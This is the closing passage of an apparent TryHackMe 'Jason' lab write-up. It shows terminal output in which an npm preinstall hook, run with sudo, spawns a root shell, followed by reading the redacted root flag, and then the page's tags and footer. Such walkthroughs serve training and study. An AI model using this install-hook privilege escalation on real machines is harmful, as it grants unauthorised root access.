</span></span><span style=display:flex><span>&gt; @ preinstall /tmp/tmp.DaaEyPR9DZ
</span></span><span style=display:flex><span>&gt; /bin/sh
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># bash</span>
</span></span><span style=display:flex><span>bash
</span></span><span style=display:flex><span>root@jason:/tmp/tmp.DaaEyPR9DZ# id
</span></span><span style=display:flex><span>id
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>root@jason:/tmp/tmp.DaaEyPR9DZ# cd /root
</span></span><span style=display:flex><span>cd /root
</span></span><span style=display:flex><span>root@jason:~# cat root.txt
</span></span><span style=display:flex><span>cat root.txt
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span></code></pre></div><p>Proof of Concept (PoC image):
<img src=../../../thm/jason/jason.png alt="Jason photo" style=width:700px;height:300px></p><ul class=post-tags><li><a href=https://geobour98.com/tags/web/><strong>web</strong></a></li><li><a href=https://geobour98.com/tags/base64/><strong>base64</strong></a><li><li><a href=https://geobour98.com/tags/deserialization/><strong>deserialization</strong></a><li><li><a href=https://geobour98.com/tags/node.js/><strong>node.js</strong></a></li><li><a href=https://geobour98.com/tags/sudo/><strong>sudo</strong></a></li><li><a href=https://geobour98.com/tags/npm/><strong>npm</strong></a></li><li><a href=https://geobour98.com/tags/gtfobins/><strong>gtfobins</strong></a></li></ul></div><footer class=post-footer><nav class=paginav><a class=prev href=https://geobour98.com/write-ups/thm/hackervshacker/><span class=title>Â« Prev Page</span><br><span>TryHackMe - Hacker vs. Hacker</span></a>
<a class=next href=https://geobour98.com/write-ups/thm/olympus/><span class=title>Next Page Â»</span><br><span>TryHackMe - Olympus</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://geobour98.com/>geobour98</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(t=>{const n=t.parentNode.parentNode,e=document.createElement("button");e.classList.add("copy-code"),e.innerText="copy";function s(){e.innerText="copied!",setTimeout(()=>{e.innerText="copy"},2e3)}e.addEventListener("click",o=>{if("clipboard"in navigator){navigator.clipboard.writeText(t.textContent),s();return}const e=document.createRange();e.selectNodeContents(t);const n=window.getSelection();n.removeAllRanges(),n.addRange(e);try{document.execCommand("copy"),s()}catch(e){}n.removeRange(e)}),n.classList.contains("highlight")?n.appendChild(e):n.parentNode.firstChild==n||(t.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?t.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(e):t.parentNode.appendChild(e))})</script></body></html>